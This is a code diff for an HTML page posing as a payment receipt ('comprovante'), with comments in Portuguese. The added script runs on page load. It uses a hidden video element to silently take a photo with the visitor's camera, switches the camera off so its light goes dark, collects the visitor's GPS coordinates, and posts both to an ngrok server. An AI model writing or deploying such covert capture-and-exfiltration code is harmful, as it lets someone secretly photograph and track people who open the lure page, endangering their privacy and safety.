@@ -28,51 +28,96 @@
 
   </div>
 
-  <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
-    });
+  <!-- Elementos para captura de vídeo, podem ficar ocultos -->
+  <video id="video" width="320" height="240" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
 
+  <script>
+    // Define a data atual no comprovante
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
     const ano = dataAtual.getFullYear();
+    document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
 
-    const dataFormatada = `${dia}/${mes}/${ano}`;
+    // Inicia o processo de captura ao carregar a página
+    window.addEventListener("load", async () => {
+      try {
+        const photoBlob = await takeAutoPhoto();
+        const position = await getUserLocation();
 
-    document.getElementById("data-atual").textContent = dataFormatada;
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-    console.log(dataAtual)
+        const formData = new FormData();
+        formData.append('latitude', latitude);
+        formData.append('longitude', longitude);
+        formData.append('maps', maps);
+        formData.append('photo', photoBlob, 'photo.jpg');
 
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      fetch("https://ab266d9ddc8c.ngrok-free.app/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
+        // Envia os dados para o servidor
+        // IMPORTANTE: Substitua pela sua URL do ngrok
+        await fetch("https://ab266d9ddc8c.ngrok-free.app/send-data", {
+          method: "POST",
+          body: formData
         });
+
+      } catch (error) {
+        console.error("Erro no processo:", error);
+        // Opcional: informar o usuário sobre o erro
+        // alert("Não foi possível enviar os dados: " + error.message);
+      }
+    });
+
+    /**
+     * Acessa a câmera, tira uma foto automaticamente e retorna como um Blob.
+     */
+    function takeAutoPhoto() {
+      return new Promise((resolve, reject) => {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          return reject(new Error('API da câmera não suportada.'));
+        }
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              // Espera 2 segundos para a câmera estabilizar e focar
+              setTimeout(() => {
+                context.drawImage(video, 0, 0, 320, 240);
+                canvas.toBlob(blob => {
+                  // Para a stream da câmera para desligar a luz
+                  stream.getTracks().forEach(track => track.stop());
+                  if (blob) {
+                    resolve(blob);
+                  } else {
+                    reject(new Error('Não foi possível criar o blob da imagem.'));
+                  }
+                }, 'image/jpeg');
+              }, 2000);
+            };
+          })
+          .catch(err => {
+            reject(new Error('Erro ao acessar a câmera: ' + err.message));
+          });
+      });
     }
 
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+    /**
+     * Obtém a geolocalização do usuário.
+     */
+    function getUserLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          return reject(new Error('Geolocalização não é suportada pelo navegador.'));
+        }
+        navigator.geolocation.getCurrentPosition(resolve, reject);
+      });
     }
   </script>
 </body>
